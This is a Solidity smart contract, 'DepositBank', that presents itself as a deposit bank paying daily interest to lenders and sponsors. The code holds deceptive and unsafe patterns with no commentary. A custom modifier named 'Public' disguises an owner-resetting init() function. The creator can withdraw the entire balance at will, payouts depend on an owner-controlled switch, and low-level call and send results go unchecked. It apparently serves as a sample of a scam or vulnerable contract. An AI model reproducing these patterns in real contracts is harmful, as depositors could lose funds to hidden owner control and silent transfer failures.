1 pragma solidity ^0.4.18;
2 
3 contract Base 
4 {
5     address newOwner;
6     address owner = msg.sender;
7     address creator = msg.sender;
8     
9     function isOwner()
10     internal
11     constant
12     returns(bool) 
13     {
14         return owner == msg.sender;
15     }
16     
17     function changeOwner(address addr)
18     public
19     {
20         if(isOwner())
21         {
22             newOwner = addr;
23         }
24     }
25     
26     function confirmOwner()
27     public
28     {
29         if(msg.sender==newOwner)
30         {
31             owner=newOwner;
32         }
33     }
34     
35     function canDrive()
36     internal
37     constant
38     returns(bool)
39     {
40         return (owner == msg.sender)||(creator==msg.sender);
41     }
42     
43     function WthdrawAllToCreator()
44     public
45     payable
46     {
47         if(msg.sender==creator)
48         {
49             creator.transfer(this.balance);
50         }
51     }
52     
53     function WthdrawToCreator(uint val)
54     public
55     payable
56     {
57         if(msg.sender==creator)
58         {
59             creator.transfer(val);
60         }
61     }
62     
63     function WthdrawTo(address addr,uint val)
64     public
65     payable
66     {
67         if(msg.sender==creator)
68         {
69             addr.transfer(val);
70         }
71     }
72     
73     function WithdrawToken(address token, uint256 amount)
74     public 
75     {
76         if(msg.sender==creator)
77         {
78             token.call(bytes4(sha3("transfer(address,uint256)")),creator,amount); 
79         }
80     }
81 }
82 
83 contract DepositBank is Base
84 {
85     uint public SponsorsQty;
86     
87     uint public CharterCapital;
88     
89     uint public ClientQty;
90     
91     uint public PrcntRate = 1;
92     
93     uint public MinPayment;
94     
95     bool paymentsAllowed;
96     
97     struct Lender 
98     {
99         uint LastLendTime;
100         uint Amount;
101         uint Reserved;
102     }
103     
104     mapping (address => uint) public Sponsors;
105     
106     mapping (address => Lender) public Lenders;
107     
108     event StartOfPayments(address indexed calledFrom, uint time);
109     
110     event EndOfPayments(address indexed calledFrom, uint time);
111     
112     function()
113     payable
114     {
115         ToSponsor();
116     }
117     
118     
119     ///Constructor
120     function init()
121     Public
122     {
123         owner = msg.sender;
124         PrcntRate = 5;
125         MinPayment = 1 ether;
126     }
127     
128     
129     // investors================================================================
130     
131     function Deposit() 
132     payable
133     {
134         FixProfit();//fix time inside
135         Lenders[msg.sender].Amount += msg.value;
136     }
137     
138     function CheckProfit(address addr) 
139     constant 
140     returns(uint)
141     {
142         return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
143     }
144     
145     function FixProfit()
146     {
147         if(Lenders[msg.sender].Amount>0)
148         {
149             Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
150         }
151         Lenders[msg.sender].LastLendTime=now;
152     }
153     
154     function WitdrawLenderProfit()
155     payable
156     {
157         if(paymentsAllowed)
158         {
159             FixProfit();
160             uint profit = Lenders[msg.sender].Reserved;
161             Lenders[msg.sender].Reserved = 0;
162             msg.sender.transfer(profit);        
163         }
164     }
165     
166     //==========================================================================
167     
168     // sponsors ================================================================
169     
170     function ToSponsor() 
171     payable
172     {
173         if(msg.value>= MinPayment)
174         {
175             if(Sponsors[msg.sender]==0)SponsorsQty++;
176             Sponsors[msg.sender]+=msg.value;
177             CharterCapital+=msg.value;
178         }   
179     }
180     
181     //==========================================================================
182     
183     
184     function AuthorizePayments(bool val)
185     {
186         if(isOwner())
187         {
188             paymentsAllowed = val;
189         }
190     }
191     function StartPaymens()
192     {
193         if(isOwner())
194         {
195             AuthorizePayments(true);
196             StartOfPayments(msg.sender, now);
197         }
198     }
199     function StopPaymens()
200     {
201         if(isOwner())
202         {
203             AuthorizePayments(false);
204             EndOfPayments(msg.sender, now);
205         }
206     }
207     function WithdrawToSponsor(address _addr, uint _wei)
208     payable
209     {
210         if(Sponsors[_addr]>0)
211         {
212             if(isOwner())
213             {
214                 if(_addr.send(_wei))
215                 {
216                     if(CharterCapital>=_wei)CharterCapital-=_wei;
217                     else CharterCapital=0;
218                     }
219             }
220         }
221     }
222     modifier Public{if(!finalized)_;} bool finalized;
223     function Fin(){if(isOwner()){finalized = true;}}
224     
225    
226 }